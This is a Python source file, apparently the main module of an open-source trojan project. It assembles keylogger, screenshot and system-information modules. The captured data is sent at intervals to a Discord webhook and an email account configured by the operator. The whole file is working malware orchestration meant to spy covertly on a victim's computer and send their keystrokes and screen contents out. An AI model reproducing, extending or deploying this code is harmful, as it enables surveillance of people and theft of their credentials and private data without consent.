#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from src.modules.exfiltration import Discord, Email
from src.modules.exploitation import KeyLogger, ScreenShot, SystemInformation

import configdot


class Trojan:
    def __init__(self, *,
                 exfil_time: float,
                 screenshot: [str, Path],
                 delete_screenshot: bool,
                 webhook: str,
                 smtp_host: str,
                 smtp_port: int,
                 email: str,
                 password: str):
        """Set up a Trojan composed of exploitation and exfiltration 
        modules.
        
        Args:
            exfil_time: Time in seconds to wait between periodic
                executions of the exfiltration of logged data. Set to 
                None to perform a single operation.
            screenshot: A string or instance of pathlib.Path containing
                the absolute path to the location where the screenshot
                file will be written.
            delete_screenshot: Automatically delete the screenshot 
                image after exfiltration is complete.
            webhook: URL to the Webhook set up on the Discord server's 
                configuration.
            smtp_host: Address of the SMTP host to connect to.
            smtp_port: Port in which the SMTP host is listening for
                incoming messages.
            email: Address of the account to send emails to.
            password: Password for the account.
        """
        self.exfil_time = exfil_time
        self.screenshot = screenshot
        self.delete_screenshot = delete_screenshot
        self.webhook = webhook
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.email = email
        self.password = password

    @property
    def modules(self):
        return {
            KeyLogger(exfil_time=self.exfil_time),
            ScreenShot(image_path=self.screenshot,
                       exfil_time=self.exfil_time,
                       auto_remove=self.delete_screenshot),
            SystemInformation()
        }

    def execute(self):
        with ThreadPoolExecutor() as executor:
            for module in self.modules:
                Discord(module=module,
                        webhook_url=self.webhook)
                Email(module=module,
                      smtp_host=self.smtp_host,
                      smtp_port=self.smtp_port,
                      email=self.email,
                      password=self.password)
                executor.submit(module.execute)


class TrojanConfig:
    def __init__(self, config_file: [str, Path] = None):
        """Set up a Trojan from settings defined in a configuration
        file."""
        config_file = config_file if config_file is not None else \
            Path(__file__).parent.joinpath("trojan.ini")
        self.cfg = configdot.parse_config(config_file)
        self.trojan = Trojan(exfil_time=self.cfg.Setup.ExfiltrationTime,
                             screenshot=self.cfg.Setup.ScreenshotPath,
                             delete_screenshot=self.cfg.Setup.DeleteScreenshot,
                             webhook=self.cfg.Discord.Webhook,
                             smtp_host=self.cfg.Email.Host,
                             smtp_port=self.cfg.Email.Port,
                             email=self.cfg.Email.Username,
                             password=self.cfg.Email.Password)

    def __getattr__(self, item):
        if item in self.__dict__:
            return super().__getattribute__(self, item)
        return getattr(self.trojan, item)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--config", type=str, default=None,
                        help="Absolute path to a configuration file. Defaults "
                             "to trojan.ini.")
    args = parser.parse_args()

    TrojanConfig(config_file=args.config).execute()
